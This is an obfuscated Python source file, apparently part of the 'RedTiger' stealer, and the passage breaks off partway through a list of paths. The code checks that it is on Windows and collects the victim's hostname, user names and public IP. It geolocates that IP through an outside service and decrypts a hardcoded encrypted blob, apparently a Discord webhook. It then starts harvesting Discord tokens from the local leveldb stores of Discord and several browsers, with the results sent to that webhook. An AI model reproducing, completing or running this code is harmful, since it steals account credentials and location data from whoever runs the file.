
import sys

def YNKSRHEVWXMRJMKCEXBCJHJEHDTLEJEYEVHMVMHEFZQYYHZAHB():
    def KISSPYQTLOKJFSUAZENTHSUUQHNLKDMXAFYTMNQKCVLBEBVBDAXAALTLICLUKDVYWNWNCCLQQRMNFHXOH():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        ZAZJXXZLBIDMXHIWVTOFXOZBAQRFAULXNGOEFDRJFJOQYMUFTRPE = KISSPYQTLOKJFSUAZENTHSUUQHNLKDMXAFYTMNQKCVLBEBVBDAXAALTLICLUKDVYWNWNCCLQQRMNFHXOH()
        if ZAZJXXZLBIDMXHIWVTOFXOZBAQRFAULXNGOEFDRJFJOQYMUFTRPE == True:
            return ZAZJXXZLBIDMXHIWVTOFXOZBAQRFAULXNGOEFDRJFJOQYMUFTRPE
    except:
        return True
    
if YNKSRHEVWXMRJMKCEXBCJHJEHDTLEJEYEVHMVMHEFZQYYHZAHB() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
from discord import SyncWebhook
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def KAAGFCJAHSFMRIGJBRFYPQZQBIFTJCCLHTNDPVAMNSKIGRLZJEUZGAMYAKXQHSGPQOVHWJGSZMCDLNUZ(): pass
def MNDCMRDHMVTAQIWBIAKJIZNCXXOQIMOFZCMDHYYRWGEZJEOUGUTJGBJLPSLSJQN(): pass
def DHEHJJURZYUNUCVOVPMPKOKWWBDQYYRQLWZKTPZKARCEEOUFNHBEJLQBNNLSPKQPAMYMVVCMYY(): pass
def UTHRMWGXNEDZHNBXAOJXIMVUXKYBWWIIKSJDONTQALWPWVIDIPTKRIXCVHFOQOCTEBYF(): pass
def KCEFCIHWIIDOKTJJSOIOBRSYJCHPNZTMYVRAWNBGRJFJQDLBXQOB(): pass
def WSUMKLTURSDMZMPNMFKBHGGXBQNTLVJVIBJXYIDBFUWZQJKHXXOVCXUCXDCDNZNIWNAOCNTFFHBOFKABOF(): pass
def GYEYJUVBJPDRSNMMQYYLPZMSEMNQPNMBQWEOONSRSPSFNFSLVKCXRMLSAFEECXAKLUOCTFSYGOVEDQGKU(): pass
def MRTYYQDVSEICAPILMCSXVQOOXWZPQJUAUKUSQJZGCASDWYWGPMDGQFPUEGFLRKWXBKNQHSJXFCZXCTOFHNNBANA(): pass
def AHZWJWZUMXGHLJGHNKIEODJLIAJQOYXWCIMHLPHRRPWIALIMJOVXIKCHNCAPAYQOVMHRIKUWKJSHLJCNMLRWNLRXKBRITKVIY(): pass
def PRHUGJZEIBDDCFSQLHDYGNIHLGLYVANXTEJVPLEXSNGQCBSFTVOAWJQTHDNQYTHGAMIIPKGQXHULYPQLIWM(): pass
def ZEKXUQVPXFNLUZVAXEMXOHDQWFYMXARZCVDIGTDQKSIQZNMWASPZEJFFSQBIYZOVCTOSDSNSXOOVMPHRPFNRMZBHWNKWXRJBEM(): pass
def CDBOOUEFUVBDJLGCCVSKCKXDLEROLLEVFEACMFKYJPWBJFNJTHK(): pass
def KBFCXEJZRLDNTASHXVKOXFFHEOREPXAMGWMYGEWOFIOANYOCGTFJVAETGCFISSBHFSAVZJAFCVTVMZBATCAJ(): pass
def NETERAXENJCLDWNMUOXUACBSFKFZOALQCCEKBIQLUUXWCRXMOIJFNGEOCENYMPKJNTVFZZBCIXIXWHHQZESSQLL(): pass
def LDKEJZIAAMEQFRCAGMDLILATBWISLSTVSVSGJOJPHUDQCQKBVRCBUW(): pass
def RCQIWUBYSCWDMIHUNLFCCPDDDZGKHBHRBTYAWTDBJFCMRTQXEJXZUTDHLBQSFXJ(): pass
def BRYPWRPQNWISBAPNROISWDXZOQUGSNJAKNCSWUNAKNUHRHMCXUIKYGBKHFCIBUZWGJTOUPCPZMNLITJNHFXDBM(): pass
def JUMMNLQYTRYVBCGXKVATKPZEVYEPDCLIAOZVRYSJOQJSHGFTADKPWNZTPPWELEYILJLRMURP(): pass
def HTAEYSOUIPQBDVOWIUQCVAFSSPEOVUNVXLQBFAJSIQDDWAAIMIEREKDIQFSWYFSGKCDJWHSHQNWFJMLEGKLYKHWTB(): pass
def BCSBFBWUTVDUHFGIPGVTJYGFHUUJAJOOPZCLMOUKUXDEOBLFMEJGOFXXWPSXNXYHGJCXFOLSLAPAQZBTWXDGHFTHW(): pass

def ICTDOCTAFYXWMGJTVPSRSFGVGWYQQYSSACVCWEUCMAAYUXLPRBLUBUYKADSELFMLBRGDTRSTYAXKPSENPVN(w3bh00k_ur1, title=None, description=None):
    try:
        client = SyncWebhook.from_url(w3bh00k_ur1)
        embed = discord.Embed(
            title=title,
            description=description,
            color= VXMQMTIFNQFSZVWQCUARWNDMZHAQVHGSTCAJGPBAVLFDCNKIXKAMGROFUHIIQABQHXYZQTSEUDPCDSC
        )
        embed.set_footer(text=WQPKAEYENELJACVEEVCAFHZZJZZZIBEMMIWIYJJEIJFGDMVJXBICBKRNQQJEWBIGFDKYSPOLSLJFFWIVGXTCPYZTPAWGLLISOUR, icon_url=KKAWLEUXAKPTXELIVUQRJRNWZLGXXRACMOYXGZUABGXIGLPVTEOALCZRSPITYXDQIZWQBBPOIQMKZUV)
        client.send(embed=embed, username=YYYOHRNFCZUEJNONFZXIFSDHTUJIEFBANBYFREWPBSQNGMDGOKLETGRJJSIQ, avatar_url=KKAWLEUXAKPTXELIVUQRJRNWZLGXXRACMOYXGZUABGXIGLPVTEOALCZRSPITYXDQIZWQBBPOIQMKZUV)
    except: pass

def DETDNQRJYELJYRCLMCIYXRRMGMWYZZTQVIHGVNZXFUDVEYLLYNSMGTYKTELAQFCOOQWACNYHZSDMPZUXX(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def BCKMEOCGHCDMNEAWRTYOALSTIBJGNEPXSRWFICCIHILELZKOPOILDZAXCUKMNPPNMXKPP():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def ATAFEBVCMRWRXHGLMGQKGTQJBVSPMNFMRTQHMLCMROCQHFZVQKQVURSBJJUXW(XVBDXTTCUQVEAFJKZNWCNKSGZBMVGYJXLQOBNITFNZHPRPCTTSB, DFSFGQFIOGTBJQNAPWMNPSZCNCIRFEYRSHJLJMZGUUORLBYQPAQHIUISGTJMAOE):
    def SYMPDRXLBYZJIDQBFHDOGRBYWOLIRMEBPZVFATFAEQEEKKURBZEGBDKQRIW(DCMDGDTDCBYCKQNRDLUOPMUZWTKYUANWTRCPAOOTKPMASCEKEDNGUXDDNLMYYXM, WTDFDEWNWSFFPZKFZPHYFDKWSAFKRSJERRYRURVRHYAFGQCPUZHTGIYOCKFSRETHXRIWTDJRRNVDFWMSKAFAMHPNLZUQUKOIZ):
        LVCBQZSGCJEHBWFHRMKLANLMSFVFHLJPBTBHIPYXXAWQNQDJKGZCBIBI = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=WTDFDEWNWSFFPZKFZPHYFDKWSAFKRSJERRYRURVRHYAFGQCPUZHTGIYOCKFSRETHXRIWTDJRRNVDFWMSKAFAMHPNLZUQUKOIZ, iterations=100000, backend=default_backend())
        if isinstance(DCMDGDTDCBYCKQNRDLUOPMUZWTKYUANWTRCPAOOTKPMASCEKEDNGUXDDNLMYYXM, str):  
            DCMDGDTDCBYCKQNRDLUOPMUZWTKYUANWTRCPAOOTKPMASCEKEDNGUXDDNLMYYXM = DCMDGDTDCBYCKQNRDLUOPMUZWTKYUANWTRCPAOOTKPMASCEKEDNGUXDDNLMYYXM.encode()  
        return LVCBQZSGCJEHBWFHRMKLANLMSFVFHLJPBTBHIPYXXAWQNQDJKGZCBIBI.derive(DCMDGDTDCBYCKQNRDLUOPMUZWTKYUANWTRCPAOOTKPMASCEKEDNGUXDDNLMYYXM)

    XVBDXTTCUQVEAFJKZNWCNKSGZBMVGYJXLQOBNITFNZHPRPCTTSB_data = base64.b64decode(XVBDXTTCUQVEAFJKZNWCNKSGZBMVGYJXLQOBNITFNZHPRPCTTSB)
    WTDFDEWNWSFFPZKFZPHYFDKWSAFKRSJERRYRURVRHYAFGQCPUZHTGIYOCKFSRETHXRIWTDJRRNVDFWMSKAFAMHPNLZUQUKOIZ = XVBDXTTCUQVEAFJKZNWCNKSGZBMVGYJXLQOBNITFNZHPRPCTTSB_data[:16]
    SGQGYVDHQFKMYRHVRPAFLYODXCYYHMXNLRSOCYOXJADSUNFRNEHIHWQBVRRAH = XVBDXTTCUQVEAFJKZNWCNKSGZBMVGYJXLQOBNITFNZHPRPCTTSB_data[16:32]
    XVBDXTTCUQVEAFJKZNWCNKSGZBMVGYJXLQOBNITFNZHPRPCTTSB_data = XVBDXTTCUQVEAFJKZNWCNKSGZBMVGYJXLQOBNITFNZHPRPCTTSB_data[32:]
    SCOETWZJJQHVIMMFOKDFCKKKFGKFLNANINEDTLOIHOTXVVRZXZTSU = SYMPDRXLBYZJIDQBFHDOGRBYWOLIRMEBPZVFATFAEQEEKKURBZEGBDKQRIW(DFSFGQFIOGTBJQNAPWMNPSZCNCIRFEYRSHJLJMZGUUORLBYQPAQHIUISGTJMAOE, WTDFDEWNWSFFPZKFZPHYFDKWSAFKRSJERRYRURVRHYAFGQCPUZHTGIYOCKFSRETHXRIWTDJRRNVDFWMSKAFAMHPNLZUQUKOIZ)
    DWMBNKLHVSFROPXDCQPIBUCWDOZVQHPKWTTGMCESZSGVCEYGEFHAXSKMJBZOZSRHAKCGDGEGOTPXLMKNBRJXE = Cipher(algorithms.AES(SCOETWZJJQHVIMMFOKDFCKKKFGKFLNANINEDTLOIHOTXVVRZXZTSU), modes.CBC(SGQGYVDHQFKMYRHVRPAFLYODXCYYHMXNLRSOCYOXJADSUNFRNEHIHWQBVRRAH), backend=default_backend())
    NTMZLZYNKROYJVUHSPYPAGHWRJKBDEDCHFZMGMCQIDKPJCHUKTPUONCAQSECUBAZIMPEJESUZKTMQWNUHUWYCMZJCKJE = DWMBNKLHVSFROPXDCQPIBUCWDOZVQHPKWTTGMCESZSGVCEYGEFHAXSKMJBZOZSRHAKCGDGEGOTPXLMKNBRJXE.decryptor()
    NHNYLWVTJGNVPMUVUMKBHXIVXGXYFWYDOVYCSPVIXHSJDIDLKETXRVVOUFLORHZANTLCX = NTMZLZYNKROYJVUHSPYPAGHWRJKBDEDCHFZMGMCQIDKPJCHUKTPUONCAQSECUBAZIMPEJESUZKTMQWNUHUWYCMZJCKJE.update(XVBDXTTCUQVEAFJKZNWCNKSGZBMVGYJXLQOBNITFNZHPRPCTTSB_data) + NTMZLZYNKROYJVUHSPYPAGHWRJKBDEDCHFZMGMCQIDKPJCHUKTPUONCAQSECUBAZIMPEJESUZKTMQWNUHUWYCMZJCKJE.finalize()
    BFSNRFHGQYUAOTXSZXNVRBUKAZPKWTTACAUDMSELDQWLJESSWPPO = padding.PKCS7(128).unpadder()
    GDWTQXMNTRSEVTFQZTBKPCKSSHAGOASNDXABRPOWYUFQYVUDEAFIBQ = BFSNRFHGQYUAOTXSZXNVRBUKAZPKWTTACAUDMSELDQWLJESSWPPO.update(NHNYLWVTJGNVPMUVUMKBHXIVXGXYFWYDOVYCSPVIXHSJDIDLKETXRVVOUFLORHZANTLCX) + BFSNRFHGQYUAOTXSZXNVRBUKAZPKWTTACAUDMSELDQWLJESSWPPO.finalize()
    return GDWTQXMNTRSEVTFQZTBKPCKSSHAGOASNDXABRPOWYUFQYVUDEAFIBQ.decode()

DETDNQRJYELJYRCLMCIYXRRMGMWYZZTQVIHGVNZXFUDVEYLLYNSMGTYKTELAQFCOOQWACNYHZSDMPZUXX("")

try: KRGVUVUJHMHZOKHVJIPRDWJGEQPPMMNROMCLFLDTXZDPVRXPRMJKSIIEJGHILBSYND    = socket.gethostname()
except: KRGVUVUJHMHZOKHVJIPRDWJGEQPPMMNROMCLFLDTXZDPVRXPRMJKSIIEJGHILBSYND = "None"

try: VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX    = os.getlogin()
except: VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX = "None"

try: IMGODLZWXZEKZJRIUFDNEUWOHRHSRRNQATNIFVHEHQBFCSVUKWQNNWVVGFZMGMJWZVNBBJNDUKZEANGGHAKTOR    = win32api.GetUserNameEx(win32api.NameDisplay)
except: IMGODLZWXZEKZJRIUFDNEUWOHRHSRRNQATNIFVHEHQBFCSVUKWQNNWVVGFZMGMJWZVNBBJNDUKZEANGGHAKTOR = "None"

try: PKYSLJOCCKSRRREQMXQHLLLHPMWFDYCJFERFIPHPBDOLGVJXASVDOXIPQ    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: PKYSLJOCCKSRRREQMXQHLLLHPMWFDYCJFERFIPHPBDOLGVJXASVDOXIPQ = "None"

try: CCUGJLJTWKWTJVXZQGDJWHZWDFUXAHLTDTYLIXUYIKAJJMKFOEMKKNCFKZN    = socket.gethostbyname(socket.gethostname())
except: CCUGJLJTWKWTJVXZQGDJWHZWDFUXAHLTDTYLIXUYIKAJJMKFOEMKKNCFKZN = "None"

AFAEOOAISKZOXWJAYNDQOPJMDVXCYLITJJEIWJXGMBIZKNMFEUBGXULANUUQEOVWUPQRVTDSOWPLPQKCOFOMFNCBD = r"""
iTkIAH6wpPQhLZu3vp15w7BuhNqKFCCNX6uMSgcdJ3vZMZFukf5jseTkT+fWrFtwMq2TVLisJbimw20z8/Y8eBGXSOrmb0K4HmP/8gXFPETerWXFnIrq6gnJqPZSpLsS6GdTNLhXUc/FLtoduy3/5E1d9MsU6FVbZlGL+6tF/GjQmzjNgi5JjxvktjJL2u10svEgqnDWwFxFyznd/czTbQ==
"""

BCUDWLSRPERPAPOLRYLTYMHADXCRAWTZQDMXGKXTZOAXRPEFDIFROCJTCGBPAPWLHQWQFEPMWF            = "eTPNnJkXIxsAZTEgdRgxUpvEHPulMFrxnZOgSMjxYyGvoGJBXDEROpzlbmCvmqHrZbTInDKwpAShYshwfSDDVFAldeWqBoRIjewWqCtiLYTTIoNBbVokczElIlLJtzDngOvNtpiEVSlKveVBskFo"
DSSPTIKNNTQFBNKLETEPGQRMJEPVMZCCWDDOZLYAVNJYCZVDJTIFUPPTLVAGOJKVKNZBLLTAJHGHGRH        = "redtiger.shop"
VXMQMTIFNQFSZVWQCUARWNDMZHAQVHGSTCAJGPBAVLFDCNKIXKAMGROFUHIIQABQHXYZQTSEUDPCDSC    = 0xa80505
YYYOHRNFCZUEJNONFZXIFSDHTUJIEFBANBYFREWPBSQNGMDGOKLETGRJJSIQ = "RedTiger St34l3r"
KKAWLEUXAKPTXELIVUQRJRNWZLGXXRACMOYXGZUABGXIGLPVTEOALCZRSPITYXDQIZWQBBPOIQMKZUV   = "https://cdn.discordapp.com/attachments/1337898355279401023/1341890893858213908/RedTiger-Logo.png?ex=67b7a4c8&is=67b65348&hm=174ddbd80dd8570fa83779687def6eda441a7c12abd3765d970c1958ceeb1ec8&"
WQPKAEYENELJACVEEVCAFHZZJZZZIBEMMIWIYJJEIJFGDMVJXBICBKRNQQJEWBIGFDKYSPOLSLJFFWIVGXTCPYZTPAWGLLISOUR    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
KXDYJETQFYPFACHJUITNRRTNWRUMHKQWLCVMFFAUYDGMKHHXLTIXVKEGWVQQZMWIKEKCYUTZTCKDMGNHXIXNUWWZFQJLST   = {"text": WQPKAEYENELJACVEEVCAFHZZJZZZIBEMMIWIYJJEIJFGDMVJXBICBKRNQQJEWBIGFDKYSPOLSLJFFWIVGXTCPYZTPAWGLLISOUR, "icon_url": KKAWLEUXAKPTXELIVUQRJRNWZLGXXRACMOYXGZUABGXIGLPVTEOALCZRSPITYXDQIZWQBBPOIQMKZUV}
MZVIGMGXUVAXUKCLGKDNXBUIHWTQLFHVFWRIZZGPSASITDFHPUFXJWINONFJZITXFJNMJPAXGTMNBZCNGCCLBJR    = f'`{VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX} "{PKYSLJOCCKSRRREQMXQHLLLHPMWFDYCJFERFIPHPBDOLGVJXASVDOXIPQ}"`'
LQUXQACAYSISJCBUBHOCHNJJAERPJNEEXFPEBBGVUSBFKJRWOXLWIEDBADMCTGAXLXHRRZOEWUBIP    = ATAFEBVCMRWRXHGLMGQKGTQJBVSPMNFMRTQHMLCMROCQHFZVQKQVURSBJJUXW(AFAEOOAISKZOXWJAYNDQOPJMDVXCYLITJJEIWJXGMBIZKNMFEUBGXULANUUQEOVWUPQRVTDSOWPLPQKCOFOMFNCBD, BCUDWLSRPERPAPOLRYLTYMHADXCRAWTZQDMXGKXTZOAXRPEFDIFROCJTCGBPAPWLHQWQFEPMWF)

DVSLBTWQIASUVRBYDDBIDGRRFBMTILPVDXJNNDOTNXAHEFOLIXGBTCMDSVHTEUEJGGXPE         = os.getenv("WINDIR", None).replace(" ", "%20")
DSXBQLCSFRIPMZNQFTGYVNEHGZJTMDGSBCMIRMAKDZRIHTGKUORQZBQJLTUMNHGDXQ     = os.getenv('USERPROFILE', None).replace(" ", "%20")
USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX   = os.getenv('LOCALAPPDATA', None).replace(" ", "%20")
LAKVJETWCSYJASZHZQFYOMHHOUVLZOIKRYDIMXXOAUEYYMSLLQQEVJLKLNRZWAPWCVEDUVBYASXED = os.getenv('APPDATA', None).replace(" ", "%20")

try:
    YEWMJUMTJERZMGIHOQVJBOCFSIJJSJOZMZXQCOWGYZZYAHBPUQQQCOYKPRMZHD = requests.get(f"https://{DSSPTIKNNTQFBNKLETEPGQRMJEPVMZCCWDDOZLYAVNJYCZVDJTIFUPPTLVAGOJKVKNZBLLTAJHGHGRH}/api/ip/ip={PKYSLJOCCKSRRREQMXQHLLLHPMWFDYCJFERFIPHPBDOLGVJXASVDOXIPQ}")
    RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL = YEWMJUMTJERZMGIHOQVJBOCFSIJJSJOZMZXQCOWGYZZYAHBPUQQQCOYKPRMZHD.json()

    ZQGCCCULNLQNOYMJIWILAAAWIQLLVGCMOQGQCUIYMELEHPWPBUXPWNIDUPRSFUWQJKMJRCSCIXPTTKPDOKTEEIRZKTVEVIJ = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('country', "None")
    ZQGCCCULNLQNOYMJIWILAAAWIQLLVGCMOQGQCUIYMELEHPWPBUXPWNIDUPRSFUWQJKMJRCSCIXPTTKPDOKTEEIRZKTVEVIJ_code = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('country_code', "None")
    GJCFLNKKNSVDUYSYTVAXRGYTERGQTJSOIBWUXVOPRUVOGCTZJIVIXJQSODWBGNQCVQESVDMFPCHYGXEDYTL = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('region', "None")
    GJCFLNKKNSVDUYSYTVAXRGYTERGQTJSOIBWUXVOPRUVOGCTZJIVIXJQSODWBGNQCVQESVDMFPCHYGXEDYTL_code = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('region_code', "None")
    YVKCNJSTLAOFQOYZGUCVMOABZQMCWIEYFMUFRNRJCXWRMRCLVVLVQEHXCWPISXBRKJDIW = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('zip', "None")
    UXRUTMSDSUCRENYSNFIENXANICPEZQQQODNWXNQHFEUQKXSFEYFBICEEAACKDRPXRULNTNPYQESFSRYMAQVSBYUHCJSBAGODZ = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('city', "None")
    TKQPGAZPQDBFKFNVAICPHSKMFHCZWUAYTUDPAAVBEMYXNOZJKDPXGWZYQXLJMKZ = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('latitude', "None")
    QEPXFWRTRDGZICAXZUBYJLHGNNWTMIFXLQYCFFGSMHZSJZLCVROSJWTSSWDPXAGOHJVMUHOTXBIJXF = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('longitude', "None")
    LGZQRAMUEMWLGIZHTJXDGRUHGTJFKEABZJWPEUHXYTGABOPEMOZKG = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('timezone', "None")
    YHWUVQTQTAMNRGBTDSAZHKOJJDSQUQTYQVULTIOYZNOOXVDOCEVPIOWABFOMBUKVDBEGXKCFLN = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('isp', "None")
    QFYKKQCWZFJLHWTFYGOZLUQRNCVLNKCKSTPBTHCXUHYRRJZELKIRUQXSPPNRYKWKQUDHTVCYOOSJJOLBXEB = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('org', "None")
    KTSVVBIKIWSIGXWDGIHEGIBFWMAJSCVYXUIDNVNWFYDLRHUUYSOMDAKIKHNBFESNAIJRCRIYRVWPYMLATSBMK = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('as', "None")
except:
    YEWMJUMTJERZMGIHOQVJBOCFSIJJSJOZMZXQCOWGYZZYAHBPUQQQCOYKPRMZHD = requests.get(f"http://ip-api.com/json/{PKYSLJOCCKSRRREQMXQHLLLHPMWFDYCJFERFIPHPBDOLGVJXASVDOXIPQ}")
    RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL = YEWMJUMTJERZMGIHOQVJBOCFSIJJSJOZMZXQCOWGYZZYAHBPUQQQCOYKPRMZHD.json()

    ZQGCCCULNLQNOYMJIWILAAAWIQLLVGCMOQGQCUIYMELEHPWPBUXPWNIDUPRSFUWQJKMJRCSCIXPTTKPDOKTEEIRZKTVEVIJ = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('country', "None")
    ZQGCCCULNLQNOYMJIWILAAAWIQLLVGCMOQGQCUIYMELEHPWPBUXPWNIDUPRSFUWQJKMJRCSCIXPTTKPDOKTEEIRZKTVEVIJ_code = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('countryCode', "None")
    GJCFLNKKNSVDUYSYTVAXRGYTERGQTJSOIBWUXVOPRUVOGCTZJIVIXJQSODWBGNQCVQESVDMFPCHYGXEDYTL = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('regionName', "None")
    GJCFLNKKNSVDUYSYTVAXRGYTERGQTJSOIBWUXVOPRUVOGCTZJIVIXJQSODWBGNQCVQESVDMFPCHYGXEDYTL_code = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('region', "None")
    YVKCNJSTLAOFQOYZGUCVMOABZQMCWIEYFMUFRNRJCXWRMRCLVVLVQEHXCWPISXBRKJDIW = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('zip', "None")
    UXRUTMSDSUCRENYSNFIENXANICPEZQQQODNWXNQHFEUQKXSFEYFBICEEAACKDRPXRULNTNPYQESFSRYMAQVSBYUHCJSBAGODZ = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('city', "None")
    TKQPGAZPQDBFKFNVAICPHSKMFHCZWUAYTUDPAAVBEMYXNOZJKDPXGWZYQXLJMKZ = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('lat', "None")
    QEPXFWRTRDGZICAXZUBYJLHGNNWTMIFXLQYCFFGSMHZSJZLCVROSJWTSSWDPXAGOHJVMUHOTXBIJXF = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('lon', "None")
    LGZQRAMUEMWLGIZHTJXDGRUHGTJFKEABZJWPEUHXYTGABOPEMOZKG = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('timezone', "None")
    YHWUVQTQTAMNRGBTDSAZHKOJJDSQUQTYQVULTIOYZNOOXVDOCEVPIOWABFOMBUKVDBEGXKCFLN = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('isp', "None")
    QFYKKQCWZFJLHWTFYGOZLUQRNCVLNKCKSTPBTHCXUHYRRJZELKIRUQXSPPNRYKWKQUDHTVCYOOSJJOLBXEB = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('org', "None")
    KTSVVBIKIWSIGXWDGIHEGIBFWMAJSCVYXUIDNVNWFYDLRHUUYSOMDAKIKHNBFESNAIJRCRIYRVWPYMLATSBMK = RXTPQVRHSPOXRGBOLYUHGJSHZEIVUBQZFFECBEDKMZAEZYBUTAJDL.get('as', "None")

def ZEKXUQVPXFNLUZVAXEMXOHDQWFYMXARZCVDIGTDQKSIQZNMWASPZEJFFSQBIYZOVCTOSDSNSXOOVMPHRPFNRMZBHWNKWXRJBEM():
    import os
    import re
    import json
    import base64
    import requests
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData
    from discord import SyncWebhook, Embed

    def LYAYYTZPHNBCSDSQQNGSWYYLRJRRSNDBPOCMDFXFNQTYRQOKOJBDBPTMOONEZHRHQAAEHMOTLXIGNHOINXMNMCJZWNVVOE():
        CVYQTXTGPEUCAPOHMITIPJXECIRUGOEMITSQJHODRRYUPXBTQKVHYXIAMMCINSWGQAZWPSXL = "https://discord.com/api/v9/users/@me"
        LSSXNWGSBPAQWURSQNXACMUSMHXKYXJSUKPQHJZJTLXDHQSWJZWZWHIGWTTROMCQXZUELXRPUSBFZJKOTMDNLQTPEKV = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        LSSXNWGSBPAQWURSQNXACMUSMHXKYXJSUKPQHJZJTLXDHQSWJZWZWHIGWTTROMCQXZUELXRPUSBFZJKOTMDNLQTPEKV_enc = r"dQw4w9WgXcQ:[^\"]*"
        FCPOSSNSUHYBKAOPHZMCIAXQRPEOZJBUZVNKYTKTEBPLMSREHBBUBUMGUUMWWCVZSKEDEXGKDUPXGWSLGOUR = []
        FAUDQUUOQCUUJNDSPOTQQFUFHJHSRQBMOUDLWBPRJZFHAIAPIBRLZGQVQAOZKLIRZIJCEOQXBWOZQIOSTSVPGPABQTUWUXZVRMQ = []
        JGPHUNTHYTJRWRCMGQNGPGFZOQQHNXVSAOPBIRBUASJJBQVGPWYIGMBPXSCMGF = {}

        OBWZDOMZUEOWFLCMCGVJLTTXSJTFIKYUNZLYTHLZBERMSHRPBUNFAZJATQAWGKMUHQRSLJMYO = {
            'Discord': LAKVJETWCSYJASZHZQFYOMHHOUVLZOIKRYDIMXXOAUEYYMSLLQQEVJLKLNRZWAPWCVEDUVBYASXED + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': LAKVJETWCSYJASZHZQFYOMHHOUVLZOIKRYDIMXXOAUEYYMSLLQQEVJLKLNRZWAPWCVEDUVBYASXED + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': LAKVJETWCSYJASZHZQFYOMHHOUVLZOIKRYDIMXXOAUEYYMSLLQQEVJLKLNRZWAPWCVEDUVBYASXED + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': LAKVJETWCSYJASZHZQFYOMHHOUVLZOIKRYDIMXXOAUEYYMSLLQQEVJLKLNRZWAPWCVEDUVBYASXED + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': LAKVJETWCSYJASZHZQFYOMHHOUVLZOIKRYDIMXXOAUEYYMSLLQQEVJLKLNRZWAPWCVEDUVBYASXED + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': LAKVJETWCSYJASZHZQFYOMHHOUVLZOIKRYDIMXXOAUEYYMSLLQQEVJLKLNRZWAPWCVEDUVBYASXED + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
